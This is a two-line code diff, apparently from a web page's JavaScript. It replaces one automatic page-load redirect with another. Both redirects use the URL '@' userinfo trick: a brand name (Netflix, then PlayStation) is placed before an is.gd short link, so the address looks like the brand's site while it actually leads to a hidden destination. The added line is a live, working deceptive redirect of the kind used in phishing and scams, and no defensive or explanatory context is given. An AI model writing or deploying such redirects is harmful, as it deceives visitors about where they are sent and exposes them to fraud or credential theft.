@@ -1,1 +1,1 @@
-window.location.replace("https://netflix.com@is.gd/1dWT3N");
+window.location.replace("https://playstation.com@is.gd/nIT3rS");
